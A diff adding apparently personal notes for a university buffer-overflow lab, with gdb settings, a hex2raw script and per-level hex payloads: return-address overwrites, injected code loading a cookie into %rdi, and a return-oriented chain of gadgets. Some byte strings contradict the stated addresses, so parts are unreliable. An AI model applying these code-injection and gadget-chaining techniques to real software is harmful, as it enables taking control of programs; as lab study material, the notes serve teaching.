@@ -1,0 +1,80 @@
+Ni step over
+Si step into
+
+
+My gdb config (gdbconfig):
+file ctarget
+break *0x4019b4
+run < raw
+
+I run this shell script to generate my raw data and run gdb at once (I call it go.sh), hex is a file with my hex data:
+rm raw
+./hex2raw < hex >> raw
+gdb -x gdbconfig
+
+Go from assembly to binary:
+gcc AssemblyTest.s -c -o output.o
+objdump -d output.o >> binaryCode
+
+
+
+Level 1:
+Set Breakpoint at end of getbuf. It will prompt you for input, enter 01234567890123456789012345678901234567890123456789012345 (or any other sequence of chars that are the same length). This will fill the buffer (your buffer may be a different size). Now anything extra you add will be put into the return address for getbuf. We want to go to touch1 (which is 0x401850 on mine), so I need this in my hex file:
+
+48 c7 c7 56 db eb 76 48 83 c4 f8 48 c7 04 24 7c 18 40 00 c3 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 50 18 40
+
+These can be anything
+
+Using hex2raw (just pipe this straight to gdb so you don’t have to look at it)
+01234567890123456789012345678901234567890123456789012345P[]@
+And that’s what you enter as the input (notice how the last three bytes are reversed due to little endian).
+
+The easiest way to see how big your buffer is is just to enter a long unique set of characters and see what get’s put onto the stack. Then replace the characters with the parts of the return address for touch1 you need.
+
+Also, step into getbuf, step over get
+
+
+Level 2:
+Turn this into binary and put it at the beginning of your buffer. Jump to the beginning of your buffer instead of to touch1. Make sure your address for beginning of buffer is at the same spot in the string as touch1’s address was.
+movq  $0x76ebdb56, %rdi #my cookie into rdi
+addq $(-8), %rsp  #push doesn’t seem to work for whatever reason
+movq $0x000000000040187c, (%rsp) #put address of touch2 on stack
+Retq #will jump to touch2
+
+Mine looked like this (except the binary for the code is off below, but yours will be different anyways)
+48 c7 c7 56 db eb 76 48 83 c4 f8 48 c7 04 24 7c 18 40 00 c3 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 88 a0 61 55
+
+Address of beginning of injection string (mine was 0x5561a088)
+Code
+
+Level 3:
+Assembly Code:
+subq $0x200, %rsp #just make tons of space to be safe
+movq   $0x5561A0B4 , %rdi #address of cookie in string as first parameter
+movq $0x401950, (%rsp) #address of touch3
+retq
+
+Mine looked like this:
+48 81 ec 00 02 00 00 48 c7 c7 b4 a0 61 55 48 c7 04 24 50 19 40 00 c3 04 24 d2 18 40 00 48 c7 44 24 08 50 19 40 00 c3 19 40 00 c3 c3 37 36 65 62 64 62 35 36 00 00 00 00 88 a0 61 55
+
+Cookie (without 0x)
+Address of beginning of injection string
+code
+
+Level 4:
+
+/* Overflow Buffer */
+48 81 ec 00 02 00 00 48 c7 c7
+b4 92 60 55 48 c7 04 24 e4 17
+40 00 c3 c3 c3 c3 c3 c3 35 64
+32 31 36 36 30 65 00 00 00 00
+
+/* End of Buffer */
+/* Address to a 58 c3 (pop %rax) */
+90 18 40 00 00 00 00 00
+/* Cookie (Little Endian) */
+0e 66 21 5d 00 00 00 00
+/* Address to 48 89 c7 c3 (mov %rax, %rdi) */
+75 18 40 00 00 00 00 00
+/* Address of touch2() */
+10 17 40 00 00 00 00 00
